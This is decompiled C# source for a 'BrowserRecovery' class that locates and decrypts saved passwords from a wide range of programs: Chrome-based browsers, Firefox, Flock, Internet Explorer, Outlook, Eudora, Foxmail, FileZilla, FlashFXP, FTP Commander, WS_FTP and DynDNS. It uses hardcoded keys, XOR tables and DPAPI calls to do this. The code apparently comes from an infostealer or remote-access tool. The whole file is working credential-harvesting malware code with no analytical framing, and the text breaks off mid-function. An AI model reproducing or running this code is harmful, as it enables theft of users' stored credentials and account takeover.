using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using My;
using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;

internal sealed class BrowserRecovery
{
    private static readonly byte[] _iv = new byte[] { 0x34, 0x12, 120, 0x56, 0xab, 0x90, 0xef, 0xcd };
    private static readonly byte[] _wsftpkey = new byte[] { 
        0xe1, 240, 0xc3, 210, 0xa5, 180, 0x87, 150, 0x69, 120, 0x4b, 90, 0x2d, 60, 15, 30,
        0x34, 0x12, 120, 0x56, 0xab, 0x90, 0xef, 0xcd
    };
    private const string BASE64 = "+-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    private static byte[] opera_salt = new byte[] { 0x83, 0x7d, 0xfc, 15, 0x8e, 0xb3, 0xe8, 0x69, 0x73, 0xaf, 0xff };

    internal static string base64Decode(string data)
    {
        string str;
        try
        {
            System.Text.Decoder decoder = new UTF8Encoding().GetDecoder();
            byte[] bytes = Convert.FromBase64String(data);
            char[] chars = new char[(decoder.GetCharCount(bytes, 0, bytes.Length) - 1) + 1];
            decoder.GetChars(bytes, 0, bytes.Length, chars, 0);
            str = new string(chars);
        }
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            Exception exception = exception1;
            str = null;
            ProjectData.ClearProjectError();
        }
        return str;
    }

    internal static object DecodeBase64(string data) => 
        Encoding.UTF8.GetString(Convert.FromBase64String(data));

    internal static string decodeFoxPW(int v, string pHash)
    {
        string str = "";
        try
        {
            int[] sourceArray = new int[] { 0x7e, 100, 0x72, 0x61, 0x47, 0x6f, 110, 0x7e };
            int[] numArray6 = new int[] { 0x7e, 70, 0x40, 0x37, 0x25, 0x6d, 0x24, 0x7e };
            int num = Convert.ToInt32("5A", 0x10);
            if (v == 1)
            {
                sourceArray = null;
                sourceArray = numArray6;
                numArray6 = null;
                num = Convert.ToInt32("71", 0x10);
            }
            int num3 = (int) Math.Round((double) (((double) pHash.Length) / 2.0));
            int startIndex = 0;
            int[] numArray2 = new int[(num3 - 1) + 1];
            int num7 = num3 - 1;
            for (int i = 0; i <= num7; i++)
            {
                numArray2[i] = Convert.ToInt32(pHash.Substring(startIndex, 2), 0x10);
                startIndex += 2;
            }
            int[] destinationArray = new int[(numArray2.Length - 1) + 1];
            destinationArray[0] = numArray2[0] ^ num;
            Array.Copy(numArray2, 1, destinationArray, 1, numArray2.Length - 1);
            while (numArray2.Length > sourceArray.Length)
            {
                int[] numArray7 = new int[((sourceArray.Length * 2) - 1) + 1];
                Array.Copy(sourceArray, 0, numArray7, 0, sourceArray.Length);
                Array.Copy(sourceArray, 0, numArray7, sourceArray.Length, sourceArray.Length);
                sourceArray = null;
                sourceArray = numArray7;
                numArray7 = null;
            }
            int[] numArray4 = new int[(numArray2.Length - 1) + 1];
            int num8 = numArray2.Length - 1;
            for (int j = 1; j <= num8; j++)
            {
                numArray4[j - 1] = numArray2[j] ^ sourceArray[j - 1];
            }
            int[] numArray5 = new int[(numArray4.Length - 1) + 1];
            int num9 = numArray4.Length - 2;
            for (int k = 0; k <= num9; k++)
            {
                if ((numArray4[k] - destinationArray[k]) < 0)
                {
                    numArray5[k] = (numArray4[k] + 0xff) - destinationArray[k];
                }
                else
                {
                    numArray5[k] = numArray4[k] - destinationArray[k];
                }
                str = str + Conversions.ToString(Strings.ChrW(numArray5[k]));
            }
        }
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            Exception exception = exception1;
            ProjectData.ClearProjectError();
        }
        return str;
    }

    internal static string DecodeWSFTP(string input)
    {
        string str;
        try
        {
            object instance = input;
            if (!input.Contains("PWD="))
            {
                instance = Convert.ToString("PWD=") + input;
            }
            object left = "";
            object objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(instance, null, "Substring", new object[] { 0x25, Operators.SubtractObject(NewLateBinding.LateGet(instance, null, "Length", new object[0], null, null, null), 0x25) }, null, null, null));
            int num3 = Conversions.ToInteger(Operators.SubtractObject(Operators.DivideObject(NewLateBinding.LateGet(objectValue, null, "Length", new object[0], null, null, null), 2), 1));
            for (int i = 0; i <= num3; i++)
            {
                object obj5 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, null, "Substring", new object[] { i * 2, 2 }, null, null, null));
                object obj6 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(instance, null, "Substring", new object[] { 5 + i, (6 + i) - (5 + i) }, null, null, null));
                int charCode = ((Convert.ToInt32(Conversions.ToString(obj5), 0x10) - i) - 1) - ((0x2f + Convert.ToInt32(Conversions.ToString(obj6), 0x10)) % 0x39);
                left = Operators.AddObject(left, Strings.ChrW(charCode));
            }
            str = Conversions.ToString(left);
        }
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            str = "Password decryption failed!";
            ProjectData.ClearProjectError();
        }
        return str;
    }

    internal static object decrypt2_method(byte[] key, byte[] encrypt_data)
    {
        object obj2;
        try
        {
            MD5CryptoServiceProvider provider = new MD5CryptoServiceProvider();
            provider.Initialize();
            byte[] destinationArray = new byte[(opera_salt.Length + (key.Length - 1)) + 1];
            Array.Copy(opera_salt, destinationArray, opera_salt.Length);
            Array.Copy(key, 0, destinationArray, opera_salt.Length, key.Length);
            byte[] sourceArray = provider.ComputeHash(destinationArray);
            destinationArray = new byte[((sourceArray.Length + opera_salt.Length) + (key.Length - 1)) + 1];
            Array.Copy(sourceArray, destinationArray, sourceArray.Length);
            Array.Copy(opera_salt, 0, destinationArray, sourceArray.Length, opera_salt.Length);
            Array.Copy(key, 0, destinationArray, sourceArray.Length + opera_salt.Length, key.Length);
            byte[] buffer2 = provider.ComputeHash(destinationArray);
            TripleDESCryptoServiceProvider provider2 = new TripleDESCryptoServiceProvider {
                Mode = CipherMode.CBC,
                Padding = PaddingMode.None
            };
            byte[] buffer6 = new byte[0x18];
            byte[] buffer3 = new byte[8];
            Array.Copy(sourceArray, buffer6, sourceArray.Length);
            Array.Copy(buffer2, 0, buffer6, sourceArray.Length, 8);
            Array.Copy(buffer2, 8, buffer3, 0, 8);
            provider2.Key = buffer6;
            provider2.IV = buffer3;
            byte[] bytes = provider2.CreateDecryptor().TransformFinalBlock(encrypt_data, 0, encrypt_data.Length);
            obj2 = Encoding.Unicode.GetString(bytes);
        }
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            Exception exception = exception1;
            obj2 = "";
            ProjectData.ClearProjectError();
        }
        return obj2;
    }

    internal static string decryptBat(string input)
    {
        if ((input.Length % 4) != 0)
        {
            return "Input text must be a multiple of 4 characters!";
        }
        byte[] buffer = new byte[0x400];
        int index = 0;
        int num2 = 0;
        while (num2 < input.Length)
        {
            int num4 = 0;
            int num5 = 0;
            do
            {
                char ch = input[num2];
                num2++;
                int num6 = "+-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".IndexOf(ch);
                if (num6 < 0)
                {
                    return ("Input contains illegal character '" + Conversions.ToString((int) ch) + "'!");
                }
                num4 = (num4 << 6) + num6;
                num5++;
            }
            while (num5 <= 3);
            buffer[index] = (byte) ((num4 >> 0x10) & 0xff);
            index++;
            buffer[index] = (byte) ((num4 >> 8) & 0xff);
            index++;
            buffer[index] = (byte) (num4 & 0xff);
            index++;
        }
        byte[] buffer2 = TrimBytes(buffer);
        string str2 = "";
        int length = buffer2.Length;
        while (length > 4)
        {
            length--;
            str2 = str2 + Conversions.ToString(Strings.ChrW(buffer2[length] ^ 90));
        }
        return str2;
    }

    internal static string decryptOutlookPassword(byte[] encryptedData)
    {
        byte[] dst = new byte[(encryptedData.Length - 2) + 1];
        Buffer.BlockCopy(encryptedData, 1, dst, 0, encryptedData.Length - 1);
        return Encoding.UTF8.GetString(ProtectedData.Unprotect(dst, null, DataProtectionScope.CurrentUser)).Replace(Conversions.ToString(Convert.ToChar(0)), "");
    }

    internal static string DecryptWSFTP(string text)
    {
        string str;
        object obj2 = text;
        if (text[0] == '_')
        {
            obj2 = text.Substring(1);
        }
        try
        {
            byte[] inputBuffer = Convert.FromBase64String(Conversions.ToString(obj2));
            object instance = new TripleDESCryptoServiceProvider();
            NewLateBinding.LateSet(instance, null, "Key", new object[] { _wsftpkey }, null, null);
            NewLateBinding.LateSet(instance, null, "Mode", new object[] { CipherMode.CBC }, null, null);
            NewLateBinding.LateSet(instance, null, "IV", new object[] { _iv }, null, null);
            NewLateBinding.LateSet(instance, null, "Padding", new object[] { PaddingMode.None }, null, null);
            byte[] bytes = ((ICryptoTransform) NewLateBinding.LateGet(instance, null, "CreateDecryptor", new object[0], null, null, null)).TransformFinalBlock(inputBuffer, 0, inputBuffer.Length);
            str = Conversions.ToString(Encoding.UTF8.GetString(bytes));
        }
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            Exception exception = exception1;
            str = null;
            ProjectData.ClearProjectError();
        }
        return str;
    }

    internal static List<RecoveredBrowserAccount> dyndns()
    {
        List<RecoveredBrowserAccount> list2;
        List<RecoveredBrowserAccount> list = new List<RecoveredBrowserAccount>();
        try
        {
            object obj3 = Operators.ConcatenateObject(Strings.Replace(Interaction.Environ("ALLUSERSPROFILE") + @"\", @"\\", @"\", 1, -1, CompareMethod.Binary), @"DynDNS\Updater\config.dyndns");
            if (File.Exists(Conversions.ToString(obj3)))
            {
                IEnumerator enumerator;
                Array array = File.ReadAllLines(Conversions.ToString(obj3));
                try
                {
                    enumerator = array.GetEnumerator();
                    while (enumerator.MoveNext())
                    {
                        string str3;
                        string expression = Conversions.ToString(enumerator.Current);
                        if (Strings.InStr(expression.ToLower(), "username=", CompareMethod.Binary) > 0)
                        {
                            str3 = Strings.Split(expression, "=", -1, CompareMethod.Binary)[1];
                        }
                        if (Strings.InStr(expression.ToLower(), "password=", CompareMethod.Binary) > 0)
                        {
                            string str;
                            string str2 = Strings.Split(expression, "=", -1, CompareMethod.Binary)[1];
                            int num4 = Strings.Len(str2);
                            for (int i = 1; i <= num4; i += 2)
                            {
                                str = str + Conversions.ToString(Strings.Chr((int) Math.Round(Conversion.Val("&H" + Strings.Mid(str2, i, 2)))));
                            }
                            int num5 = Strings.Len(str);
                            for (int j = 1; j <= num5; j++)
                            {
                                int num;
                                StringType.MidStmtStr(ref str, j, 1, Conversions.ToString(Strings.Chr(Strings.Asc(Strings.Mid(str, j, 1)) ^ Strings.Asc(Strings.Mid("t6KzXhCh", num + 1, 1)))));
                                num = (num + 1) % 8;
                            }
                            if (str3.Length == 0)
                            {
                                return list2;
                            }
                            RecoveredBrowserAccount item = new RecoveredBrowserAccount {
                                URL = "http://DynDns.com",
                                UserName = str3,
                                Password = str,
                                Browser = "DynDNS"
                            };
                            list.Add(item);
                        }
                    }
                }
                finally
                {
                    if (enumerator is IDisposable)
                    {
                        (enumerator as IDisposable).Dispose();
                    }
                }
            }
            return list;
        }
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            Exception exception = exception1;
            list2 = new List<RecoveredBrowserAccount>();
            ProjectData.ClearProjectError();
            return list2;
        }
        return list;
    }

    internal static RecoveredBrowserAccount Eudora()
    {
        RecoveredBrowserAccount account2;
        RecoveredBrowserAccount account = new RecoveredBrowserAccount();
        try
        {
            string lpFileName = Conversions.ToString(MyProject.Computer.Registry.GetValue(@"HKEY_CURRENT_USER\Software\Qualcomm\Eudora\CommandLine", "current", null)).Split(new char[] { ' ' })[2];
            StringBuilder lpReturnedString = new StringBuilder(500);
            string lpAppName = "Settings";
            string lpKeyName = "SavePasswordText";
            string lpDefault = "";
            int num = GetPrivateProfileString(ref lpAppName, ref lpKeyName, ref lpDefault, lpReturnedString, lpReturnedString.Capacity, ref lpFileName);
            StringBuilder builder2 = new StringBuilder(500);
            lpDefault = "Settings";
            lpKeyName = "ReturnAddress";
            lpAppName = "";
            int num2 = GetPrivateProfileString(ref lpDefault, ref lpKeyName, ref lpAppName, builder2, builder2.Capacity, ref lpFileName);
            account.URL = "-";
            account.UserName = builder2.ToString();
            account.Password = Encoding.UTF8.GetString(Convert.FromBase64String(lpReturnedString.ToString()));
            account.Browser = "Eudora";
            account2 = account;
        }
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            Exception exception = exception1;
            account2 = new RecoveredBrowserAccount();
            ProjectData.ClearProjectError();
        }
        return account2;
    }

    internal static List<RecoveredBrowserAccount> FileZilla()
    {
        List<RecoveredBrowserAccount> list = new List<RecoveredBrowserAccount>();
        try
        {
            string[] strArray = Strings.Split(File.ReadAllText(Interaction.Environ("APPDATA") + @"\FileZilla\recentservers.xml"), "<Server>", -1, CompareMethod.Binary);
            if (strArray == null)
            {
                return null;
            }
            foreach (string str in strArray)
            {
                IEnumerator enumerator;
                object obj2 = Strings.Split(str, "\r\n", -1, CompareMethod.Binary);
                try
                {
                    enumerator = ((IEnumerable) obj2).GetEnumerator();
                    while (enumerator.MoveNext())
                    {
                        string expression = Conversions.ToString(enumerator.Current);
                        RecoveredBrowserAccount item = new RecoveredBrowserAccount();
                        if (expression.Contains("<Host>"))
                        {
                            item.URL = Strings.Split(Strings.Split(expression, "<Host>", -1, CompareMethod.Binary)[1], "</Host>", -1, CompareMethod.Binary)[0] + ":" + Strings.Split(Strings.Split(expression, "<Port>", -1, CompareMethod.Binary)[1], "</Port>", -1, CompareMethod.Binary)[0];
                        }
                        if (expression.Contains("<User>"))
                        {
                            item.UserName = Strings.Split(Strings.Split(expression, "<User>", -1, CompareMethod.Binary)[1], "</User>", -1, CompareMethod.Binary)[0];
                        }
                        if (expression.Contains("<Pass encoding=\"base64\">"))
                        {
                            item.Password = Conversions.ToString(DecodeBase64(Strings.Split(Strings.Split(expression, "<Pass encoding=\"base64\">", -1, CompareMethod.Binary)[1], "</Pass>", -1, CompareMethod.Binary)[0]));
                        }
                        else if (expression.Contains("<Pass>"))
                        {
                            item.Password = Strings.Split(Strings.Split(expression, "<Pass>", -1, CompareMethod.Binary)[1], "</Pass>", -1, CompareMethod.Binary)[0];
                        }
                        item.Browser = "FileZilla";
                        list.Add(item);
                    }
                }
                finally
                {
                    if (enumerator is IDisposable)
                    {
                        (enumerator as IDisposable).Dispose();
                    }
                }
            }
        }
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            Exception exception = exception1;
            List<RecoveredBrowserAccount> list2 = new List<RecoveredBrowserAccount>();
            ProjectData.ClearProjectError();
            return list2;
        }
        return list;
    }

    internal static string FL(string s)
    {
        string str = "abc�defg�h�ijklmno�pqrs�tu�vwxyz1234567890_-.~!@#$%^&*()[{]}\\|';:,<>/?+=\r\n ";
        string str3 = "";
        string str5 = s;
        int num = 0;
        int length = str5.Length;
        while (num < length)
        {
            string str4 = Conversions.ToString(str5[num]);
            if (str.Contains(str4.ToLower()))
            {
                str3 = str3 + str4;
            }
            num++;
        }
        return str3;
    }

    internal static List<RecoveredBrowserAccount> FlashFXP()
    {
        List<RecoveredBrowserAccount> list = new List<RecoveredBrowserAccount>();
        try
        {
            string path = Strings.Replace(Interaction.Environ("APPDATA"), Interaction.Environ("Username"), "All Users", 1, -1, CompareMethod.Binary) + @"\FlashFXP\3quick.dat";
            if (!File.Exists(path))
            {
                return new List<RecoveredBrowserAccount>();
            }
            string sInhalt = P.ReadFile(path);
            string str3 = P.Cut(sInhalt, "IP=", "\r\n");
            string str5 = P.Cut(sInhalt, "port=", "\r\n");
            string str7 = P.Cut(sInhalt, "user=", "\r\n");
            string str6 = P.Cut(sInhalt, "pass=", "\r\n");
            string str = P.Cut(sInhalt, "created=", "\r\n");
            if (str7 != "")
            {
                try
                {
                    RecoveredBrowserAccount item = new RecoveredBrowserAccount {
                        URL = str3 + ":" + str5,
                        UserName = str7,
                        Password = str6,
                        Browser = "FlashFXP"
                    };
                    list.Add(item);
                }
                catch (Exception exception1)
                {
                    ProjectData.SetProjectError(exception1);
                    Exception exception = exception1;
                    ProjectData.ClearProjectError();
                }
            }
            return list;
        }
        catch (Exception exception3)
        {
            ProjectData.SetProjectError(exception3);
            Exception exception2 = exception3;
            List<RecoveredBrowserAccount> list2 = new List<RecoveredBrowserAccount>();
            ProjectData.ClearProjectError();
            return list2;
        }
        return list;
    }

    internal static List<RecoveredBrowserAccount> Flock()
    {
        List<RecoveredBrowserAccount> list2;
        List<RecoveredBrowserAccount> list = new List<RecoveredBrowserAccount>();
        string str = string.Empty;
        string str4 = string.Empty;
        string str2 = string.Empty;
        object objectValue = RuntimeHelpers.GetObjectValue(Firefox.mozProfilePath("flock"));
        string path = Conversions.ToString(Operators.ConcatenateObject(objectValue, "signons3.txt"));
        try
        {
            Firefox.Load(Conversions.ToString(objectValue));
            string input = File.ReadAllText(path);
            int count = Regex.Matches(input, Regex.Escape("---")).Count;
            int num3 = count - 1;
            for (int i = 0; i <= num3; i++)
            {
                string[] strArray = GetBetween(input, "\r\n.\r\n", "---", i).Split(new char[] { '\r' });
                str = strArray[0];
                str4 = strArray[1];
                str2 = Conversions.ToString(Firefox.mozDecryptString(strArray[4]));
                if (!string.IsNullOrEmpty(str4) && (str2 != null))
                {
                    RecoveredBrowserAccount item = new RecoveredBrowserAccount {
                        URL = str,
                        UserName = str4,
                        Password = str2,
                        Browser = "Flock Browser"
                    };
                    list.Add(item);
                }
            }
            Firefox.Unload();
            list2 = list;
        }
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            Exception exception = exception1;
            Firefox.Unload();
            list2 = new List<RecoveredBrowserAccount>();
            ProjectData.ClearProjectError();
        }
        return list2;
    }

    internal static List<RecoveredBrowserAccount> FtpCommander()
    {
        List<RecoveredBrowserAccount> list = new List<RecoveredBrowserAccount>();
        try
        {
            string path = Strings.Replace(P.RegRead(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\FTP Commander\UninstallString"), "uninstall.exe", null, 1, -1, CompareMethod.Binary) + "Ftplist.txt";
            if (!File.Exists(path))
            {
                return new List<RecoveredBrowserAccount>();
            }
            string sInhalt = P.ReadLine(path, -1);
            string str3 = P.Cut(sInhalt, ";Server=", ";Port=");
            string str5 = P.Cut(sInhalt, ";Port=", ";Password=");
            string str7 = P.Cut(sInhalt, ";User=", ";Anonymous=");
            string str6 = P.Cut(sInhalt, ";Password=", ";User=");
            string str = P.Cut(sInhalt, "Name=", ";Server=");
            if (str7 != "")
            {
                try
                {
                    RecoveredBrowserAccount item = new RecoveredBrowserAccount {
                        URL = str3,
                        UserName = str7,
                        Password = str6,
                        Browser = "FTPCommander"
                    };
                    list.Add(item);
                }
                catch (Exception exception1)
                {
                    ProjectData.SetProjectError(exception1);
                    Exception exception = exception1;
                    ProjectData.ClearProjectError();
                }
            }
            return list;
        }
        catch (Exception exception3)
        {
            ProjectData.SetProjectError(exception3);
            Exception exception2 = exception3;
            List<RecoveredBrowserAccount> list2 = new List<RecoveredBrowserAccount>();
            ProjectData.ClearProjectError();
            return list2;
        }
        return list;
    }

    internal static string GetBetween(string input, string str1, string str2, int ind)
    {
        string str;
        try
        {
            string str3 = Regex.Split(input, str1)[ind + 1];
            str = Regex.Split(str3, str2)[0];
        }
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            str = "No Data!";
            ProjectData.ClearProjectError();
        }
        return str;
    }

    internal static List<RecoveredBrowserAccount> GetChromePasswords()
    {
        List<RecoveredBrowserAccount> list;
        try
        {
            list = Recovery.Passwords(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Google\Chrome\User Data\Default\Login Data"), "Chrome");
        }
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            Exception exception = exception1;
            list = new List<RecoveredBrowserAccount>();
            ProjectData.ClearProjectError();
        }
        return list;
    }

    internal static List<RecoveredBrowserAccount> GetChromiumPasswords()
    {
        List<RecoveredBrowserAccount> list;
        try
        {
            list = Recovery.Passwords(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Chromium\User Data\Default\Login Data"), "SRWare Iron");
        }
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            Exception exception = exception1;
            list = new List<RecoveredBrowserAccount>();
            ProjectData.ClearProjectError();
        }
        return list;
    }

    internal static List<RecoveredBrowserAccount> GetComodoPasswords()
    {
        List<RecoveredBrowserAccount> list;
        try
        {
            list = Recovery.Passwords(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Comodo\Dragon\User Data\Default\Login Data"), "Comodo Dragon");
        }
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            Exception exception = exception1;
            list = new List<RecoveredBrowserAccount>();
            ProjectData.ClearProjectError();
        }
        return list;
    }

    internal static List<RecoveredBrowserAccount> GetCoolnovoPasswords()
    {
        List<RecoveredBrowserAccount> list;
        try
        {
            list = Recovery.Passwords(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"MapleStudio\ChromePlus\User Data\Default\Login Data"), "CoolNovo");
        }
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            Exception exception = exception1;
            list = new List<RecoveredBrowserAccount>();
            ProjectData.ClearProjectError();
        }
        return list;
    }

    internal static List<RecoveredBrowserAccount> GetFirefoxPasswords()
    {
        List<RecoveredBrowserAccount> list2;
        List<RecoveredBrowserAccount> list = new List<RecoveredBrowserAccount>();
        string str = string.Empty;
        string str3 = string.Empty;
        string str2 = string.Empty;
        try
        {
            object objectValue = RuntimeHelpers.GetObjectValue(Firefox.mozProfilePath("firefox"));
            if (!File.Exists(Conversions.ToString(Operators.ConcatenateObject(objectValue, "logins.json"))))
            {
                return null;
            }
            Firefox.Load(Conversions.ToString(objectValue));
            string input = File.ReadAllText(Conversions.ToString(Operators.ConcatenateObject(objectValue, "logins.json")));
            MatchCollection matchs = new Regex("\\\"(hostname|encryptedPassword|encryptedUsername)\":\"(.*?)\"").Matches(input);
            int num2 = matchs.Count - 1;
            for (int i = 0; i <= num2; i += 3)
            {
                str = matchs[i].Groups[2].Value;
                str3 = matchs[i + 1].Groups[2].Value;
                str2 = matchs[i + 2].Groups[2].Value;
                if ((!string.IsNullOrEmpty(str) && !string.IsNullOrEmpty(str3)) && (str2 != null))
                {
                    RecoveredBrowserAccount item = new RecoveredBrowserAccount {
                        URL = str,
                        UserName = Conversions.ToString(Firefox.mozDecryptString(str3)),
                        Password = Conversions.ToString(Firefox.mozDecryptString(str2)),
                        Browser = "Firefox"
                    };
                    list.Add(item);
                }
            }
            Firefox.Unload();
            list2 = list;
        }
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            Exception exception = exception1;
            Firefox.Unload();
            list2 = new List<RecoveredBrowserAccount>();
            ProjectData.ClearProjectError();
        }
        return list2;
    }

    internal static List<RecoveredBrowserAccount> GetFoxmailPasswords()
    {
        List<RecoveredBrowserAccount> list = new List<RecoveredBrowserAccount>();
        try
        {
            string directoryName = Path.GetDirectoryName(Conversions.ToString(RuntimeHelpers.GetObjectValue(MyProject.Computer.Registry.GetValue(@"HKEY_CURRENT_USER\Software\Aerofox\FoxmailPreview", "Executable", null))));
            string str = Path.GetDirectoryName(Conversions.ToString(RuntimeHelpers.GetObjectValue(MyProject.Computer.Registry.GetValue(@"HKEY_CURRENT_USER\Software\Aerofox\Foxmail\V3.1", "FoxmailPath", null))));
            string[] directories = Directory.GetDirectories(directoryName + @"\Storage\");
            string[] strArray = new string[0];
            if (Directory.Exists(str + @"\mail\"))
            {
                strArray = Directory.GetDirectories(str + @"\mail\");
            }
            else if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData).ToString() + @"\VirtualStore\Program Files\Foxmail\mail\"))
            {
                strArray = Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData).ToString() + @"\VirtualStore\Program Files\Foxmail\mail\");
            }
            else
            {
                strArray = Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData).ToString() + @"\VirtualStore\Program Files (x86)\Foxmail\mail\");
            }
            string[] strArray3 = new string[((directories.Length + strArray.Length) - 1) + 1];
            int num8 = directories.Length - 1;
            for (int i = 0; i <= num8; i++)
            {
                strArray3[i] = directories[i] + @"\Accounts\Account.rec0";
            }
            int index = 0;
            int num9 = strArray3.Length - 1;
            for (int j = directories.Length; j <= num9; j++)
            {
                strArray3[j] = strArray[index] + @"\Account.stg";
                index++;
            }
            foreach (string str4 in strArray3)
            {
                object instance = new FileStream(str4, FileMode.Open);
                object left = Conversions.ToInteger(NewLateBinding.LateGet(instance, null, "Length", new object[0], null, null, null));
                object objectValue = new byte[Conversions.ToInteger(Operators.SubtractObject(left, 1)) + 1];
                bool flag = false;
                string str3 = "";
                int v = 0;
                RecoveredBrowserAccount item = new RecoveredBrowserAccount();
                object[] arguments = new object[] { RuntimeHelpers.GetObjectValue(objectValue), 0, RuntimeHelpers.GetObjectValue(left) };
                bool[] copyBack = new bool[] { true, false, true };
                NewLateBinding.LateCall(instance, null, "Read", arguments, null, null, copyBack, true);
                if (copyBack[0])
                {
                    objectValue = RuntimeHelpers.GetObjectValue(arguments[0]);
                }
                if (copyBack[2])
                {
                    left = RuntimeHelpers.GetObjectValue(arguments[2]);
                }
                if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateIndexGet(objectValue, new object[] { 0 }, null), 0xd0, false))
                {
                    v = 0;
                }
                else
                {
                    v = 1;
                }
                int num11 = Conversions.ToInteger(Operators.SubtractObject(left, 1));
                for (int k = 0; k <= num11; k++)
                {
                    RecoveredBrowserAccount account3;
                    if ((!Operators.ConditionalCompareObjectGreater(NewLateBinding.LateIndexGet(objectValue, new object[] { k }, null), 0x20, false) || !Operators.ConditionalCompareObjectLess(NewLateBinding.LateIndexGet(objectValue, new object[] { k }, null), 0x7f, false)) || !Operators.ConditionalCompareObjectNotEqual(NewLateBinding.LateIndexGet(objectValue, new object[] { k }, null), 0x3d, false))
                    {
                        goto Label_05EB;
                    }
                    str3 = str3 + Conversions.ToString(Strings.ChrW(Conversions.ToInteger(NewLateBinding.LateIndexGet(objectValue, new object[] { k }, null))));
                    if (!str3.Equals("Account") && !str3.Equals("MailAddress"))
                    {
                        goto Label_044E;
                    }
                    int num6 = k + 9;
                    if (v == 0)
                    {
                        num6 = k + 2;
                    }
                    goto Label_03E7;
                Label_039E:
                    account3 = item;
                    account3.UserName = account3.UserName + Conversions.ToString(Strings.ChrW(Conversions.ToInteger(NewLateBinding.LateIndexGet(objectValue, new object[] { num6 }, null))));
                    num6++;
                Label_03E7:;
                    if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateIndexGet(objectValue, new object[] { num6 }, null), 0x20, false) && Operators.ConditionalCompareObjectLess(NewLateBinding.LateIndexGet(objectValue, new object[] { num6 }, null), 0x7f, false))
                    {
                        goto Label_039E;
                    }
                    flag = true;
                    k = num6;
                    continue;
                Label_044E:
                    if (!flag || (!str3.Equals("Password") && !str3.Equals("POP3Password")))
                    {
                        continue;
                    }
                    int num7 = k + 9;
                    if (v == 0)
                    {
                        num7 = k + 2;
                    }
                    string pHash = "";
                    goto Label_04CA;
                Label_048F:;
                    pHash = pHash + Conversions.ToString(Strings.ChrW(Conversions.ToInteger(NewLateBinding.LateIndexGet(objectValue, new object[] { num7 }, null))));
                    num7++;
                Label_04CA:;
                    if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateIndexGet(objectValue, new object[] { num7 }, null), 0x20, false) && Operators.ConditionalCompareObjectLess(NewLateBinding.LateIndexGet(objectValue, new object[] { num7 }, null), 0x7f, false))
                    {
                        goto Label_048F;
                    }
                    if (pHash != "")
                    {
                        item.Password = decodeFoxPW(v, pHash);
                    }
                    else
                    {
                        item.Password = "!empty!";
                    }
                    bool flag2 = false;
                    foreach (RecoveredBrowserAccount account2 in list)
                    {
                        if (account2.UserName.Equals(item.UserName) && account2.Password.Equals(item.Password))
                        {
                            flag2 = true;
                            break;
                        }
                    }
                    if (!flag2)
                    {
                        item.Browser = "Foxmail";
                        item.URL = "-";
                        list.Add(item);
                        flag2 = false;
                    }
                    item = null;
                    item = new RecoveredBrowserAccount();
                    flag = false;
                    k = num7;
                    continue;
                Label_05EB:
                    str3 = "";
                }
            }
        }
        catch (Exception exception1)
        {
            ProjectData.SetProjectError(exception1);
            Exception exception = exception1;
            List<RecoveredBrowserAccount> list2 = new List<RecoveredBrowserAccount>();
            ProjectData.ClearProjectError();
            return list2;
        }
        return list;
    }

    internal static List<RecoveredBrowserAccount> GetIExplorerPasswords()
    {
        List<RecoveredBrowserAccount> list = new List<RecoveredBrowserAccount>();
        try
        {
            IEnumerator enumerator;
            ResourceManager manager = new ResourceManager("IELibrary", Assembly.GetExecutingAssembly());
            byte[] rawAssembly = (byte[]) manager.GetObject("IELibrary");
            MethodInfo method = Assembly.Load(rawAssembly).GetType("IELibrary.InternetExplorer").GetMethod("GetSavedPasswords");
            object objectValue = RuntimeHelpers.GetObjectValue(method.Invoke(method, new object[0]));
            try
            {
                enumerator = ((IEnumerable) objectValue).GetEnumerator();
                while (enumerator.MoveNext())
                {
                    object instance = RuntimeHelpers.GetObjectValue(enumerator.Current);
                    RecoveredBrowserAccount item = new RecoveredBrowserAccount {
                        URL = Conversions.ToString(NewLateBinding.LateGet(instance, null, "URL", new object[0], null, null, null)),
                        UserName = Conversions.ToString(NewLateBinding.LateGet(instance, null, "UserName", new object[0], null, null, null)),
                        Password = Conversions.ToString(NewLateBinding.LateGet(instance, null, "Password", new object[0], null, null, null)),
